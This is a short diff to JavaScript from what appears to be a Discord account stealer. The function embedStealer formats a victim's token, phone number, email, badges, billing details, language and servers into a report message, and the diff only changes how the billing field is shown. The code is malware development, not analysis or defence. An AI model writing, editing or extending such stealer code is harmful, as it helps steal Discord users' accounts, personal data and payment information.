@@ -76,7 +76,7 @@ function embedStealer(infos, guilds, friends, token, embed) {
       getField('<a:aura:863691953531125820> Phone', `\`${infos.phone}\``, true),
       getField('<:aura:974711605927505990> Email', `\`${infos.mail}\``, true),
       getField('Badges', infos.badges, true),
-      getField('Billing', `\`${infos.billing}\``, true),
+      getField('Billing', infos.billing, true),
       getField('Langue', infos.langue, true),
       getField('\u200b', '**Rare Servers**\n' + guilds, false),
       getField('\u200b', "\u200b", false),
